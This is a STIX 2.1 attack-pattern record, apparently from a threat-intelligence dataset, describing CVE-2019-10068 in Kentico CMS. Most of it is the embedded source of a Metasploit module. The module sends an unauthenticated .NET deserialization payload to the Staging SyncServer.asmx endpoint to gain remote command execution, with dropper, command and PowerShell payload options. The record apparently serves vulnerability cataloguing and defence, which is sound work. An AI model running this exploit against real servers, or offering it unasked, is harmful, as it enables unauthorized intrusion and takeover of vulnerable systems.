{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b300e5e3-c14d-455e-bb9f-a6806fe9ce16",
    "created": "2024-08-14T16:52:38.819888Z",
    "modified": "2024-08-14T16:52:38.819892Z",
    "name": "Kentico CMS Staging SyncServer Unserialize Remote Command Execution",
    "description": " This module exploits a vulnerability in the Kentico CMS platform versions 12.0.14 and earlier. Remote Command Execution is possible via unauthenticated XML requests to the Staging Service SyncServer.asmx interface ProcessSynchronizationTaskData method stagingTaskData parameter. XML input is passed to an insecure .NET deserialize call which allows for remote command execution.  'DisclosureDate' => '2019-04-15'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/kentico_staging_syncserver.rb",
            "external_id": "kentico_staging_syncserver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10068"
        },
        {
            "source_name": "reference",
            "url": "https://www.aon.com/cyber-solutions/aon_cyber_labs/unauthenticated-remote-code-execution-in-kentico-cms/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kentico CMS Staging SyncServer Unserialize Remote Command Execution',\n        'Description' => %q{\n          This module exploits a vulnerability in the Kentico CMS platform versions 12.0.14 and earlier.\n          Remote Command Execution is possible via unauthenticated XML requests to the Staging Service\n          SyncServer.asmx interface ProcessSynchronizationTaskData method stagingTaskData parameter. XML\n          input is passed to an insecure .NET deserialize call which allows for remote command execution.\n        },\n        'DisclosureDate' => '2019-04-15',\n        'Author' => [\n          'Manoj Cherukuri', # Discovery\n          'Justin LeMay',     # Discovery\n          'aushack',          # msf exploit\n        ],\n        'References' => [\n          ['CVE', '2019-10068'],\n          ['URL', 'https://www.aon.com/cyber-solutions/aon_cyber_labs/unauthenticated-remote-code-execution-in-kentico-cms/']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Payload' => { 'DisableNops' => true },\n        'Targets' => [\n          [\n            'Windows EXE Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_dropper\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_command,\n              'Space' => 3000\n            }\n          ],\n          [\n            'Windows Powershell',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_powershell\n            }\n          ]\n        ]\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Path to SyncServer.asmx', '/CMSPages/Staging/SyncServer.asmx']),\n      Opt::RPORT(80)\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET'\n    })\n\n    if res && res.body =~ /SyncServer Web Service/i # SOAP endpoint disco / WSDL\n      return CheckCode::Detected\n    end\n\n    return CheckCode::Safe\n  end\n\n  def exploit\n    case target['Type']\n    when :windows_command\n      execute_command(payload.encoded)\n    when :windows_dropper\n      cmd_target = targets.select { |target| target['Type'] == :windows_command }.first\n      execute_cmdstager({ linemax: cmd_target.opts['Space'] })\n    when :windows_powershell\n      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    sploit = ::Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :WindowsIdentity,\n      formatter: :SoapFormatter\n    )\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/ProcessSynchronizationTaskData'),\n      'method' => 'POST',\n      'vars_post' => { 'stagingTaskData' => sploit }\n    })\n\n    unless res && res.body.include?('Unable to cast object of type')\n      fail_with(Failure::UnexpectedReply, 'The payload was rejected')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}